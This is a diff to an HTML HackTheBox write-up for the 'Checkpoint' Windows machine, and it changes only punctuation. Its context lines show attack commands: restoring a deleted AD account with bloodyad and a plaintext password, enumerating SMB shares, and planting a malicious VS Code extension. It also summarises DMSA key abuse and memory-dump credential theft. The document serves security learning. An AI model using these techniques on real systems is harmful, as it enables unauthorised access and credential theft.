@@ -4,7 +4,7 @@
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <meta name="theme-color" content="#030305"/>
-<title>Checkpoint — HTB Write Up | pumkin</title>
+<title>Checkpoint - HTB Write Up | pumkin</title>
 <meta name="description" content="HackTheBox Checkpoint (Medium, Windows) full write up: AD enumeration → deleted object restoration → malicious VSIX extension → Kerberos DMSA impersonation → memory forensics → root."/>
 <link rel="icon" href="../cat.png"/>
 <style>
@@ -128,13 +128,13 @@ distinguishedName: OU=Employees,DC=checkpoint,DC=htb
 permission: CREATE_CHILD</pre>
 
       <h3>Restoring a deleted object</h3>
-      <p>Mark Davies was deleted from the directory — but our account has write access to the tombstone. bloodAD can restore it.</p>
+      <p>Mark Davies was deleted from the directory - but our account has write access to the tombstone. bloodAD can restore it.</p>
       <pre>bloodyad -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.28.9 \
   set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
 
 [+] CN=Mark Davies has been restored successfully under
     CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb</pre>
-      <p><code>mark.davies</code> reuses the same password as the initial user. The restored account turns out to be able to <strong>write to the DevDrop SMB share</strong> — a drop folder for approved VS Code extensions.</p>
+      <p><code>mark.davies</code> reuses the same password as the initial user. The restored account turns out to be able to <strong>write to the DevDrop SMB share</strong> - a drop folder for approved VS Code extensions.</p>
       <pre>nxc smb 10.129.28.9 -u mark.davies -p 'Checkpoint2024!' -d checkpoint.htb --shares
 
 SMB  ...  Share     Permissions  Remark
@@ -188,9 +188,9 @@ smb: \NightlyBackup_2024-11-01\memory forensics\&gt; get "Windows Server 2019-Sn
 
       <h2>Key Takeaways</h2>
       <ul>
-        <li><strong>Deleted AD objects can be a backdoor</strong> — write access to a tombstone lets an attacker restore a principal whose password was never reset.</li>
-        <li><strong>Approved app-drop folders are a supply-chain vector</strong> — a "vetted" VSIX/plugin is executed by the victim with their privileges.</li>
-        <li><strong>DMSAs are recoverable through impersonation</strong> — machine accounts holding DMSA privileges leak the service account's current and previous keys in a TGS.</li>
+        <li><strong>Deleted AD objects can be a backdoor</strong> - write access to a tombstone lets an attacker restore a principal whose password was never reset.</li>
+        <li><strong>Approved app-drop folders are a supply-chain vector</strong> - a "vetted" VSIX/plugin is executed by the victim with their privileges.</li>
+        <li><strong>DMSAs are recoverable through impersonation</strong> - machine accounts holding DMSA privileges leak the service account's current and previous keys in a TGS.</li>
         <li><strong>Backup shares full of memory snapshots</strong> are effectively credential stores; one Volatility run can dump the whole local account database.</li>
       </ul>
 
